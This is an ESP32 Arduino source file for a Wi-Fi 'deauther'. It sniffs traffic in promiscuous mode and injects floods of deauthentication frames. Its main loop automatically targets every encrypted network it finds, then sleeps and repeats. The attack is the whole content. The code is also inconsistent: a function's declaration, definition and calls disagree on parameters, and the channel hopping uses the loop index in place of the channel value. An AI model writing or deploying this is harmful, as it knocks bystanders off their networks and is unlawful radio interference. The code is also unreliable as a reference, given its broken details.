// vim: set noet sw=4 ts=4 sts=4 et ft=ino :
// -*- mode:arduino; -*-
// --------------------------------------------------------
// Copyright (C) 2025 by Anoduck, The Anonymous Duck
// https://anoduck.mit-license.org
// --------------------------------------------------------
// Referencing documentation on wifi
// https://github.com/espressif/arduino-esp32/tree/master/libraries/WiFi/examples
// Include Statements
// -----------------------------------------
#include "WiFi.h"
#include <esp_wifi.h>
#include <esp_pm.h>
#include <esp_wifi_netif.h>
#include <esp_wifi_types.h>
#include <esp_wifi_types_generic.h>
#include <esp_wifi_ap_get_sta_list.h>
#include "wifi_tx.cpp"
#include "types.h"
#include <MacAddress.h>

// Constant Statements
// -----------------------------------------
// GPIO 2 CONSTANT
const int LED_PIN = 2;

// Initialize Mac Randomizer
// ----------------------------------------
MacRandomizer macRandom;

// Deauth Constants
// -----------------------------------------
// const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t*)cbuf;
// const wifi_packet_t *packet = (wifi_packet_t*)raw_packet->payload;
// const mac_hdr_t *mac_header = &packet->hdr;

// const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

const uint8_t SCAN_ROUNDS = 5;

// Power Save Constants
// -----------------------------------------
#define uS_TO_S_FACTOR 1000000ULL
const int TIME_TO_SLEEP = 300;

// Deauth Constants
// -----------------------------------------
#define AP_SSID "ESP32-Deauther"
#define AP_PASS "esp32wroom32"
#define LED 2
#define SERIAL_DEBUG
#define CHANNEL_MAX 13
#define NUM_FRAMES_PER_DEAUTH 16
#define DEAUTH_BLINK_TIMES 2
#define DEAUTH_BLINK_DURATION 20
#define DEAUTH_TYPE_SINGLE 0
#define DEAUTH_TYPE_ALL 1

#ifdef SERIAL_DEBUG
#define DEBUG_PRINT(...) Serial.print(__VA_ARGS__)
#define DEBUG_PRINTLN(...) Serial.println(__VA_ARGS__)
#define DEBUG_PRINTF(...) Serial.printf(__VA_ARGS__)
#endif
#ifndef SERIAL_DEBUG
#define DEBUG_PRINT(...)
#define DEBUG_PRINTLN(...)
#define DEBUG_PRINTF(...)
#endif
#ifdef LED
#define BLINK_LED(num_times, blink_duration) blink_led(num_times, blink_duration)
#endif
#ifndef LED
#define BLINK_LED()
#endif

void blink_led(int num_times, int blink_duration);

// ===============================================
// Function Statements
// ----------------------------------------------
void net_conf();
int scan_net(void);
IRAM_ATTR void sniffer();
void initPowerManager();
void enableSleep();
void startSleep();
void print_wakeup_reason();

// ==========================================
// Deauth Variables -------------------------
void start_deauth(int wifi_number, int attack_type, uint16_t reason);
void stop_deauth();

extern int eliminated_stations;
extern int deauth_type;

//====================================================================
// Variable Statements
// -------------------------------------------------------------------
// Global variables(initializing the wifi channel to 1 as default)
int wifi_channel = 1;
// Let's create an array which holds the channels we want to hop back in forth on.
// For this we will use: 1,3,6,10,11,14
// we need to check this before trying.
int CH_ARRAY[6] = {1, 3, 6, 9, 11};

// Now we need to create a new variable for hopspeed. We set our pretty low for faster hops.
int hop_delay = 5;

int scan_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
int send_delay = 10; // Value is in milliseconds(1000ms = 1s) can set to 0 for faster rates
int deauthPacketRetransmissions = 40; // Packet retransmission value[~5-10 LOW | ~20-50 MEDIUM | 50+ HIGH | 100+ EXTREME **ONLY USE WITH PROPER COOLING]
int retransmissionSessions = 3; // Number of times to repeat the retransmission of the packets

// ------------------------------------------------------------------------------------------
// Functions
// ------------------------------------------------------------------------------------------
const wifi_promiscuous_filter_t filt = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;



esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

//*****************************************************************************
// ESP32 Power Management Functions
//*****************************************************************************
//void initPowerManager() {
//  // ESP32 power management settings
//  esp_pm_config_esp32_t esp_pm_config_esp32;
//  esp_pm_config_esp32.max_cpu_freq = RTC_CPU_FREQ_240M;
//  esp_pm_config_esp32.min_cpu_freq = RTC_CPU_FREQ_XTAL;
//  esp_pm_config_esp32.light_sleep_enable = true;
//  esp_pm_configure(&esp_pm_config_esp32);
//
//  // Turn off the Wi-Fi to save power
//  WiFi.mode(WIFI_OFF);
//}

// ----------------------------------------------------------------------------------------------
// Sniffer Function | wifi_promiscuous_cb_t |  wifi_promiscuous_pkt_type_t type
// ----------------------------------------------------------------------------------------------
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_t type) {
  wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t*)buf;
  wifi_packet_t *packet = (wifi_packet_t*)raw_packet->payload;
  mac_hdr_t *mac_header = &packet->hdr;
  uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

//-------------------------------------------------
// Start Deauthentication
// -----------------------------------------------
void start_deauth(int wifi_number, uint16_t reason) {
  eliminated_stations = 0;

  deauth_frame.reason = reason;

  DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
  WiFi.softAPdisconnect();
  WiFi.mode(WIFI_MODE_STA);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  WiFi.begin();
}

// ---------------------------------------------------------
// Stop Deauthentication
// ---------------------------------------------------------
void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false);
}

// ====================================================================================
// Configure the Network
// ------------------------------------------------------------------------------------
void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);   // Turn off LED
  Serial.begin(115200);

  // Initialize WiFi in STA(station) mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Set configuration values
  wifi_country_t config = {
    .cc = "US",
    .schan = 1,
    .nchan = 11,
    .policy = WIFI_COUNTRY_POLICY_MANUAL,
  };
  WiFi.setTxPower(WIFI_POWER_19_5dBm);

  // Enable promiscuous mode
  esp_wifi_set_promiscuous(true);
  // Preliminary set channel to 6
  esp_wifi_set_channel(WiFi.channel(6), WIFI_SECOND_CHAN_NONE);
  // esp_wifi_set_protocol(ifx, WIFI_PROTOCOL_11B);
  WiFi.begin();
  Serial.println("Scanning for networks...");
}

// ----------------------------------------------------------------------
// MAIN LOOP
// ----------------------------------------------------------------------
void loop() {
  char err = false;
  int ii = 0;
  size_t size_charray = sizeof(CH_ARRAY) / sizeof(CH_ARRAY[0]);
  while (ii < SCAN_ROUNDS)
  {
    int i;
    for (int i = 0; i < size_charray; i++)
    {
      int wifi_channel = CH_ARRAY[i];
      esp_wifi_set_channel(i, WIFI_SECOND_CHAN_NONE);
      Serial.printf("Set channel to %d.\n", i);
      int n = WiFi.scanNetworks();
      if (n >= 1)
      {
        for (int i = 0; i < n; i++)
        {
          if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN)
          {
            start_deauth(i, DEAUTH_TYPE_ALL, 0x7d3);
          };
        };
      };
      delay(scan_delay);
    }
    ii++;
  }
  // Sleep to conserve power
  Serial.println("Going to sleep now");
  esp_sleep_enable_timer_wakeup(TIME_TO_SLEEP * uS_TO_S_FACTOR);
  Serial.println("Setup ESP32 to sleep for every " + String(TIME_TO_SLEEP) +
  " Seconds");
  Serial.flush();
  esp_deep_sleep_start();
  Serial.println("This will never be printed");
}
